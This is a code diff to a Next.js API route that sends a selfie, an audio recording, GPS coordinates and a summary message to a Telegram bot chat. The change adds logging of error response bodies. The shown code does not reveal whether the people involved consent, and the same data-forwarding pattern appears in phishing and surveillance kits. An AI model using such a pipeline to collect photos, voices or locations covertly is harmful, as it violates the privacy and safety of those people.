@@ -30,9 +30,12 @@ export async function POST(req: NextRequest) {
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
           method: "POST",
           body: formData,
-          // DO NOT set Content-Type header for FormData, fetch will set it automatically
-        }).then(res => {
+        }).then(async res => {
           console.log("Selfie API response status:", res.status);
+          if (!res.ok) {
+            const errorBody = await res.text(); // Get full error body
+            console.error("Selfie API error response:", errorBody);
+          }
           return res;
         })
       );
@@ -52,9 +55,12 @@ export async function POST(req: NextRequest) {
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
           method: "POST",
           body: formData,
-          // DO NOT set Content-Type header for FormData, fetch will set it automatically
-        }).then(res => {
+        }).then(async res => {
           console.log("Audio API response status:", res.status);
+          if (!res.ok) {
+            const errorBody = await res.text(); // Get full error body
+            console.error("Audio API error response:", errorBody);
+          }
           return res;
         })
       );
@@ -74,8 +80,12 @@ export async function POST(req: NextRequest) {
             latitude: latitude,
             longitude: longitude,
           }),
-        }).then(res => {
+        }).then(async res => {
           console.log("Location API response status:", res.status);
+          if (!res.ok) {
+            const errorBody = await res.text(); // Get full error body
+            console.error("Location API error response:", errorBody);
+          }
           return res;
         })
       );
@@ -98,13 +108,17 @@ export async function POST(req: NextRequest) {
           chat_id: TELEGRAM_CHAT_ID,
           text: summaryText,
         }),
-      }).then(res => {
+      }).then(async res => {
         console.log("Summary message API response status:", res.status);
+        if (!res.ok) {
+            const errorBody = await res.text(); // Get full error body
+            console.error("Summary message API error response:", errorBody);
+        }
         return res;
       })
     );
 
-    await Promise.allSettled(messages); // Use allSettled to ensure all promises run even if one fails
+    await Promise.allSettled(messages);
 
     return NextResponse.json({ message: "Data processed and sent to Telegram." });
   } catch (error: any) {
